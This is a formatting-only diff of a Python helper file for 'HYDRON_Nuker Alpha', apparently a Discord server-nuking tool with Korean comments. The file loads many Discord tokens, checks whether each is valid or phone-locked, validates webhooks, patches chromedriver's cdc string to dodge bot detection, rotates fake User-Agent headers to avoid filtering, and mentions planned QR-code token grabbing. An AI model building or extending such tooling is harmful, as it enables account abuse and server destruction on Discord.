@@ -1,7 +1,7 @@
 import os
-from typing import ClassVar, Final, Literal, Optional # <-- 시스템 명령어를 쓸 일이 많음
-from colorama import Fore # <-- 디자인(배경 X 글씨 O)
-import requests # <-- 웹페이지에 요청을 보낼 때 헤더가 필요한데 얘가 좀 도움이 됨
+from typing import ClassVar, Final, Literal, Optional  # <-- 시스템 명령어를 쓸 일이 많음
+from colorama import Fore  # <-- 디자인(배경 X 글씨 O)
+import requests  # <-- 웹페이지에 요청을 보낼 때 헤더가 필요한데 얘가 좀 도움이 됨
 import ctypes
 
 from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
@@ -32,32 +32,50 @@ lb = Fore.LIGHTBLUE_EX
 
 ###### 색 지정 ######
 
-tokencnt = len(open('token.txt', 'r', encoding='utf-8').readlines()) # 토큰 갯수 카운팅
+tokencnt = len(open("token.txt", "r", encoding="utf-8").readlines())  # 토큰 갯수 카운팅
 
-if os.name != "nt": # 맥은 내가 프로그램 만들 줄 몰라서 못하고 리눅스는 굳이..? 해서 윈도우로 필터링함.
+if os.name != "nt":  # 맥은 내가 프로그램 만들 줄 몰라서 못하고 리눅스는 굳이..? 해서 윈도우로 필터링함.
     print("ㅈㅅㅈㅅ, 님 OS에서 이거 안 돌아감")
     exit(-1)
 
-os.system("title 엔터를 눌러라 닝겐...") # 타이틀에 명령하기
+os.system("title 엔터를 눌러라 닝겐...")  # 타이틀에 명령하기
 
-def OKAYLIST(): # 우리 프로그램은 메인 화면에서 메뉴가 띄워진 다음에 
+
+def OKAYLIST():  # 우리 프로그램은 메인 화면에서 메뉴가 띄워진 다음에
     os.system("cls")
     global responseList
-    responseList = ['yes', 'y', 'yeah', 'yep', 'ok', 'okay', 'yee', 'ye', 'sure', 'good']
+    responseList = [
+        "yes",
+        "y",
+        "yeah",
+        "yep",
+        "ok",
+        "okay",
+        "yee",
+        "ye",
+        "sure",
+        "good",
+    ]
+
 
 # 크롬 드라이버를 이용하여 다양한 기능 : ex) 오토로그인, Qr그래빙
 # 에 쓸 것임.
 # 이야 크롬드라이버 다운로드 스크립트 찾았다.
 
-google_target_version = 0 # 버전을 특정짓지 않음.(계속 업뎃되니까)
+google_target_version = 0  # 버전을 특정짓지 않음.(계속 업뎃되니까)
 
-class Chrome_Installer(object): # 크롬 드라이버 설치 스크립트
+
+class Chrome_Installer(object):  # 크롬 드라이버 설치 스크립트
     installed: ClassVar[bool] = False
     DL_BASE: Final[str] = "https://chromedriver.storage.googleapis.com/"
 
-    def __init__(self, executable_path: Optional[str] = None,
-                 target_version: Optional[int] = None,
-                 *args, **kwargs):
+    def __init__(
+        self,
+        executable_path: Optional[str] = None,
+        target_version: Optional[int] = None,
+        *args,
+        **kwargs,
+    ):
         self.platform = sys.platform
 
         if google_target_version:
@@ -68,7 +86,7 @@ class Chrome_Installer(object): # 크롬 드라이버 설치 스크립트
 
         if not self.target_version:
             self.target_version = self.get_release_version_number().version[0]
-            
+
         self._base = base_ = "chromedriver{}"
 
         exe_name = self._base
@@ -90,7 +108,7 @@ class Chrome_Installer(object): # 크롬 드라이버 설치 스크립트
 
     @staticmethod
     def random_cdc() -> bytes:
-        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
+        cdc = random.choices("abcdefghijklmnopqrstuvwxyz", k=26)
         cdc[-6:-4] = map(str.upper, cdc[-6:-4])
         cdc[2] = cdc[0]
         cdc[3] = "_"
@@ -133,28 +151,43 @@ class Chrome_Installer(object): # 크롬 드라이버 설치 스크립트
             os.chmod(self._exe_name, 0o755)
         return self._exe_name
 
+
 def get_driver():
-    driverList = ['chromedriver.exe'] # 우리는 구글파로 들어간다.(오페라, 익스플로러는 나중에 완성하고 나서 추가적으로 만들 예정)
+    driverList = [
+        "chromedriver.exe"
+    ]  # 우리는 구글파로 들어간다.(오페라, 익스플로러는 나중에 완성하고 나서 추가적으로 만들 예정)
     Write.print("\n설치된 드라이버 확인중!", Colors.blue_to_cyan, interval=0.015)
     sleep(0.052)
-    for driver in driverList: # 드라이브 리스트에 설치 되어있는 목록들 체킹
-        if os.path.exists(os.getcwd() + os.sep + driver): # os.sep = '\\'
-            Write.print("\n크롬 드라이버가 이미 설치되어 있음!", Colors.blue_to_cyan, interval=0.015) # 만약 현재 폴더에 드라이버가 있다면
+    for driver in driverList:  # 드라이브 리스트에 설치 되어있는 목록들 체킹
+        if os.path.exists(os.getcwd() + os.sep + driver):  # os.sep = '\\'
+            Write.print(
+                "\n크롬 드라이버가 이미 설치되어 있음!", Colors.blue_to_cyan, interval=0.015
+            )  # 만약 현재 폴더에 드라이버가 있다면
             sleep(0.5)
-            return driver # 드라이버 이름 리턴
-        else: # 드라이버 설치...
-            Write.print("\n드라이버를 설치해 드림!\n\n", Colors.blue_to_cyan, interval=0.015) # 설치 메시지
-            if os.path.exists(os.getenv('localappdata', default="") + '\\Google'):
-                Chrome_Installer() # 크롬 드라이버 설치 스크립트 실행
+            return driver  # 드라이버 이름 리턴
+        else:  # 드라이버 설치...
+            Write.print(
+                "\n드라이버를 설치해 드림!\n\n", Colors.blue_to_cyan, interval=0.015
+            )  # 설치 메시지
+            if os.path.exists(os.getenv("localappdata", default="") + "\\Google"):
+                Chrome_Installer()  # 크롬 드라이버 설치 스크립트 실행
                 Write.print("\n크롬드라이버 실행파일 설치 완료!", Colors.blue_to_cyan, interval=0.015)
-                return "chromedriver.exe" # 크롬 최고!
+                return "chromedriver.exe"  # 크롬 최고!
             else:
-                Write.print("\n오류 | 드라이버 찾기 / 설치에 오류가 생겼습니다. 다시 시도 할게요!!\n", Colors.blue_to_cyan, interval=0.035)
+                Write.print(
+                    "\n오류 | 드라이버 찾기 / 설치에 오류가 생겼습니다. 다시 시도 할게요!!\n",
+                    Colors.blue_to_cyan,
+                    interval=0.035,
+                )
                 Chrome_Installer()
-                Write.Print("\n크롬 드라이버를 다운로드합니다!\n\n", Colors.blue_to_cyan, interval=0.015)
+                Write.Print(
+                    "\n크롬 드라이버를 다운로드합니다!\n\n", Colors.blue_to_cyan, interval=0.015
+                )
                 return "chromedriver.exe"
 
+
 ######################### 드라이버 설치 끝 #########################
+
 
 def clear():
     system = os.name
@@ -162,23 +195,28 @@ def clear():
     if system == "nt":
         os.system("cls")
     else:
-        print('\n' * 120)
+        print("\n" * 120)
     return
 
+
 def LoadingAnimation():
-    loading_iconlist = ['|', '/', '-', '\\']
+    loading_iconlist = ["|", "/", "-", "\\"]
 
     for i in loading_iconlist:
         sys.stdout.write(f"""\r{ly}[{b}#{ly}]{w} 로딩중... {i}""")
         sys.stdout.flush()
         sleep(0.1)
-    
-def PrintAnimation(letters: str): # 글자를 애니메이션화 하여 출력
-    for letter in letters:
-        sys.stdout.write(letter);sys.stdout.flush();sleep(0.25) # 0.25초씩 딜레이 주면서 추력
 
-def TokenValidator(token: str): # 토큰이 유효한지 검사하는 discord api
-    '''내가 제작한 코드가 아니라, discord api뒤져서 가져옴'''
+
+def PrintAnimation(letters: str):  # 글자를 애니메이션화 하여 출력
+    for letter in letters:
+        sys.stdout.write(letter)
+        sys.stdout.flush()
+        sleep(0.25)  # 0.25초씩 딜레이 주면서 추력
+
+
+def TokenValidator(token: str):  # 토큰이 유효한지 검사하는 discord api
+    """내가 제작한 코드가 아니라, discord api뒤져서 가져옴"""
     base_url = "https://discord.com/api/v9/users/@me"
     message = "You need to verify your account in order to perform this action."
 
@@ -187,7 +225,7 @@ def TokenValidator(token: str): # 토큰이 유효한지 검사하는 discord ap
         print(f"\n{Fore.RED}존재하지 않는 토큰입니다!{Fore.RESET}")
         sleep(1)
         __import__("Hydron").main()
-    j = requests.get(f'{base_url}/billing/subscriptions', headers=heads(token)).json()
+    j = requests.get(f"{base_url}/billing/subscriptions", headers=heads(token)).json()
     try:
         if j["message"] == message:
             print(f"\n{Fore.RED}폰 락된 토큰입니다!{Fore.RESET}")
@@ -196,60 +234,63 @@ def TokenValidator(token: str): # 토큰이 유효한지 검사하는 discord ap
     except TypeError:
         pass
 
+
 headers = [
     {
         "Content-Type": "application/json",
-        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0",
     },
-
     {
         "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
+        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
     },
-
     {
         "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
+        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
     },
-
     {
         "Content-Type": "application/json",
-        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
+        "User-Agent": "Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0",
     },
-
     {
         "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
+        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
     },
-
     {
-       "Content-Type": "application/json",
-       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-    }
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+    },
 ]
 
+
 def heads(token: Optional[str] = None):
-    header = random.choice(headers).copy() # 필터링 방지
+    header = random.choice(headers).copy()  # 필터링 방지
     if token:
         header["Authorization"] = token
     return header
 
-def getTemp() -> str | Literal[-1]: # temp 폴더 경로 복사
+
+def getTemp() -> str | Literal[-1]:  # temp 폴더 경로 복사
     system = os.name
 
-    if system != 'nt':
+    if system != "nt":
         return -1
     else:
-        return os.getenv('temp', -1)
+        return os.getenv("temp", -1)
 
-def validateWebhook(hook: str): # 웹훅 볼리데이터
+
+def validateWebhook(hook: str):  # 웹훅 볼리데이터
     if "api/webhooks" not in hook:
         print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
         sleep(1)
         __import__("Hydron").main()
     try:
         responce = requests.get(hook)
-    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema, requests.exceptions.ConnectionError):
+    except (
+        requests.exceptions.MissingSchema,
+        requests.exceptions.InvalidSchema,
+        requests.exceptions.ConnectionError,
+    ):
         print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
         sleep(1)
         __import__("Hydron").main()
@@ -261,15 +302,19 @@ def validateWebhook(hook: str): # 웹훅 볼리데이터
         __import__("Hydron").main()
     print(f"{Fore.GREEN}존재하는 웹훅입니다! ({j})")
 
+
 def setTitle(_str: str):
     system = os.name
 
-    if system != 'nt':
-        return -1 # 아직 지원 ㄴㄴ
+    if system != "nt":
+        return -1  # 아직 지원 ㄴㄴ
     else:
-        ctypes.windll.kernel32.SetConsoleTitleW(f"HYDRON_Nuker Alpha    |   Made by Lier0102 & ShinHaewon   |   토큰 수 : [{tokencnt}]")
+        ctypes.windll.kernel32.SetConsoleTitleW(
+            f"HYDRON_Nuker Alpha    |   Made by Lier0102 & ShinHaewon   |   토큰 수 : [{tokencnt}]"
+        )
 
-logo = r'''
+
+logo = r"""
 $$\   $$\                 $$\                               
 $$ |  $$ |                $$ |                              
 $$ |  $$ |$$\   $$\  $$$$$$$ | $$$$$$\   $$$$$$\  $$$$$$$\  
@@ -283,12 +328,14 @@ $$ |  $$ |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$  |$$ |  $$ |
            \______/             
 
            github : Lier0102 & ShinHaewon                            
-'''
+"""
 
 System.Size(120, 30)
 System.Clear()
-<<<<<<< HEAD
-Anime.Fade(Center.Center(logo), Colors.blue_to_cyan, Colorate.Vertical, interval=0.025, enter=True)
-=======
-Anime.Fade(Center.Center(logo), Colors.blue_to_cyan, Colorate.Vertical, interval=0.025, enter=True)
->>>>>>> ec22962d7a30313dc4811455e6fc38387cf3c782
+Anime.Fade(
+    Center.Center(logo),
+    Colors.blue_to_cyan,
+    Colorate.Vertical,
+    interval=0.025,
+    enter=True,
+)
